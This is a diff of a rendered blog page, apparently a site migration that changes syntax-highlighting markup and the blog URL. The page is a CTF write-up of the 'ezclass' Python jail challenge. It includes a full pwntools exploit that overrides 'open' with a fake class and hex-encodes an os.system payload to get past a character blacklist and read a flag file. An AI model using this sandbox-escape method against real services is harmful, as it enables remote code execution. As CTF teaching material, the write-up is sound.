@@ -16,7 +16,9 @@
   <link rel="stylesheet" href="/css/font.css"/>
   <link rel="stylesheet" href="/css/smigle.css"/>
   
-  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+ <link rel="stylesheet" href="/css/syntax.css">
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
   <link rel="manifest" href="/site.webmanifest">
@@ -29,14 +31,14 @@
     <div id="root">
       <header>
   <div id="brand">
-    <a class="icon-link" href="https://salvatore-abello.github.io/">
+    <a class="icon-link" href="https://blog.babelo.xyz/">
       <img
         class="icon"
         src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
       />
     </a>
     <div class="text">
-      <a href="https://salvatore-abello.github.io/"><h1>Salvatore Abello&#39;s Blog</h1></a>
+      <a href="https://blog.babelo.xyz/"><h1>Salvatore Abello&#39;s Blog</h1></a>
       <h3>Hacking &amp; other stuff</h3>
     </div>
   </div>
@@ -122,16 +124,16 @@ There are so many! But a useful one is <a href="https://www.pythontutorial.net/p
 </blockquote>
 <p>Using <code>__new__</code>, we can return some values and we can execute code, but we can&rsquo;t call functions yet.</p>
 <p>Let&rsquo;s take a look at how the classes are loaded:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_class</span>(filename, dependancies, class_name):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> dep <span style="color:#f92672">in</span> dependancies:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/&#39;</span> <span style="color:#f92672">+</span> dep, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>            exec(f<span style="color:#f92672">.</span>read())
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/&#39;</span> <span style="color:#f92672">+</span> filename, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>        exec(f<span style="color:#f92672">.</span>read())
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Here is an instance of your class&#39;</span>)
-</span></span><span style="display:flex;"><span>    print(locals()[class_name]())
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_class</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">dependancies</span><span class="p">,</span> <span class="n">class_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">dep</span> <span class="ow">in</span> <span class="n">dependancies</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/&#39;</span> <span class="o">+</span> <span class="n">dep</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exec</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/&#39;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exec</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Here is an instance of your class&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">locals</span><span class="p">()[</span><span class="n">class_name</span><span class="p">]())</span>
 </span></span></code></pre></div><p>If we&rsquo;re able to override <code>read()</code> we can get RCE.</p>
 
 <h2 id="its-time-to-get-out-of-the-pyjail">
@@ -146,88 +148,88 @@ There are so many! But a useful one is <a href="https://www.pythontutorial.net/p
 <li>Profit</li>
 </ul>
 <p>The class will look like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">open</span>(object):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(filename,<span style="color:#f92672">*</span>args):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __enter__(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __exit__(<span style="color:#f92672">*</span>args):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> open;open<span style="color:#f92672">=</span>self;<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29</span><span style="color:#e6db74">&#34;</span>  <span style="color:#75715e"># import os;os.system(&#39;cat /tmp/flag.txt&#39;)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">open</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__enter__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__exit__</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nb">open</span><span class="p">;</span><span class="nb">open</span><span class="o">=</span><span class="bp">self</span><span class="p">;</span><span class="k">return</span> <span class="s2">&#34;</span><span class="se">\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29</span><span class="s2">&#34;</span>  <span class="c1"># import os;os.system(&#39;cat /tmp/flag.txt&#39;)</span>
 </span></span></code></pre></div><p>We also need to add <code>__enter__</code> and <code>__exit__</code> because they&rsquo;re automatically called by the <code>with</code> operator.
 Inside the <code>read</code> method, we override the <code>open</code> function with our instance of the class <code>self</code> and then, we return the code to print the flag.</p>
 <p>Now we can create this class inside the service and then run it.
 The service will also ask us to specify the dependencies of the class to be executed, we put the class created before.</p>
 <p>So the service will behave like this:
 Here, we override the open function with our class:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> dep <span style="color:#f92672">in</span> dependancies:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/&#39;</span> <span style="color:#f92672">+</span> dep, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>        exec(f<span style="color:#f92672">.</span>read())
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">dep</span> <span class="ow">in</span> <span class="n">dependancies</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/&#39;</span> <span class="o">+</span> <span class="n">dep</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exec</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
 </span></span></code></pre></div><p>Now that we&rsquo;ve overridden the open function, the code passed above to print the flag will be executed here:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/&#39;</span> <span style="color:#f92672">+</span> filename, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>    exec(f<span style="color:#f92672">.</span>read())
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/&#39;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exec</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
 </span></span></code></pre></div><p>The service will then crash at this instruction, but it&rsquo;s not important:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(locals()[class_name]())
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">locals</span><span class="p">()[</span><span class="n">class_name</span><span class="p">]())</span>
 </span></span></code></pre></div>
 <h2 id="the-exploit">
   <a class="full-clickable-heading" href="#the-exploit">
     The exploit
   </a>
 </h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> remote
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_class</span>(p, classname, parent, functions):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Creating class </span><span style="color:#e6db74">{</span>classname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(classname<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(parent<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>len(functions)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> function <span style="color:#f92672">in</span> functions:
-</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(function[<span style="color:#e6db74">&#34;name&#34;</span>]<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(function[<span style="color:#e6db74">&#34;params&#34;</span>]<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(function[<span style="color:#e6db74">&#34;body&#34;</span>]<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_class</span>(p, torun, dep):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Running class </span><span style="color:#e6db74">{</span>torun<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(torun<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(dep<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bypass_char_blacklist</span>(code):
-</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> code:
-</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> hex(ord(char))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>clean_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import os
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">os.system(&#39;cat /tmp/flag.txt&#39;)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>to_exec <span style="color:#f92672">=</span> bypass_char_blacklist(clean_code)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;ezclass.bctf23-codelab.kctf.cloud&#34;</span>, <span style="color:#ae81ff">1337</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>fake_open_classname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;open&#34;</span>
-</span></span><span style="display:flex;"><span>fake_open_parent <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;object&#34;</span>
-</span></span><span style="display:flex;"><span>fake_open_functions <span style="color:#f92672">=</span> [
-</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;__init__&#34;</span>, <span style="color:#e6db74">&#34;params&#34;</span>: <span style="color:#e6db74">&#34;filename,*args&#34;</span>, <span style="color:#e6db74">&#34;body&#34;</span>: <span style="color:#e6db74">&#34;pass&#34;</span>},
-</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;__enter__&#34;</span>, <span style="color:#e6db74">&#34;params&#34;</span>: <span style="color:#e6db74">&#34;self&#34;</span>, <span style="color:#e6db74">&#34;body&#34;</span>: <span style="color:#e6db74">&#34;return self&#34;</span>},
-</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;__exit__&#34;</span>, <span style="color:#e6db74">&#34;params&#34;</span>: <span style="color:#e6db74">&#34;*args&#34;</span>, <span style="color:#e6db74">&#34;body&#34;</span>: <span style="color:#e6db74">&#34;pass&#34;</span>},
-</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;read&#34;</span>, <span style="color:#e6db74">&#34;params&#34;</span>: <span style="color:#e6db74">&#34;self&#34;</span>, <span style="color:#e6db74">&#34;body&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;global open;open=self;return </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{</span>to_exec<span style="color:#e6db74">}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>}
-</span></span><span style="display:flex;"><span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>create_class(r, fake_open_classname, fake_open_parent, fake_open_functions)
-</span></span><span style="display:flex;"><span>run_class(r, fake_open_classname, fake_open_classname)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_class</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">classname</span><span class="p">,</span> <span class="n">parent</span><span class="p">,</span> <span class="n">functions</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Creating class </span><span class="si">{</span><span class="n">classname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">classname</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">parent</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">functions</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">function</span> <span class="ow">in</span> <span class="n">functions</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">function</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">function</span><span class="p">[</span><span class="s2">&#34;params&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">function</span><span class="p">[</span><span class="s2">&#34;body&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run_class</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">torun</span><span class="p">,</span> <span class="n">dep</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Running class </span><span class="si">{</span><span class="n">torun</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">torun</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">dep</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bypass_char_blacklist</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">clean_code</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import os
+</span></span></span><span class="line"><span class="cl"><span class="s2">os.system(&#39;cat /tmp/flag.txt&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">to_exec</span> <span class="o">=</span> <span class="n">bypass_char_blacklist</span><span class="p">(</span><span class="n">clean_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;ezclass.bctf23-codelab.kctf.cloud&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_open_classname</span> <span class="o">=</span> <span class="s2">&#34;open&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_open_parent</span> <span class="o">=</span> <span class="s2">&#34;object&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_open_functions</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;__init__&#34;</span><span class="p">,</span> <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="s2">&#34;filename,*args&#34;</span><span class="p">,</span> <span class="s2">&#34;body&#34;</span><span class="p">:</span> <span class="s2">&#34;pass&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;__enter__&#34;</span><span class="p">,</span> <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="s2">&#34;self&#34;</span><span class="p">,</span> <span class="s2">&#34;body&#34;</span><span class="p">:</span> <span class="s2">&#34;return self&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;__exit__&#34;</span><span class="p">,</span> <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="s2">&#34;*args&#34;</span><span class="p">,</span> <span class="s2">&#34;body&#34;</span><span class="p">:</span> <span class="s2">&#34;pass&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;read&#34;</span><span class="p">,</span> <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="s2">&#34;self&#34;</span><span class="p">,</span> <span class="s2">&#34;body&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;global open;open=self;return </span><span class="se">\&#34;</span><span class="si">{</span><span class="n">to_exec</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">create_class</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_open_classname</span><span class="p">,</span> <span class="n">fake_open_parent</span><span class="p">,</span> <span class="n">fake_open_functions</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">run_class</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_open_classname</span><span class="p">,</span> <span class="n">fake_open_classname</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></div>
 <h3 id="output">
   <a class="full-clickable-heading" href="#output">
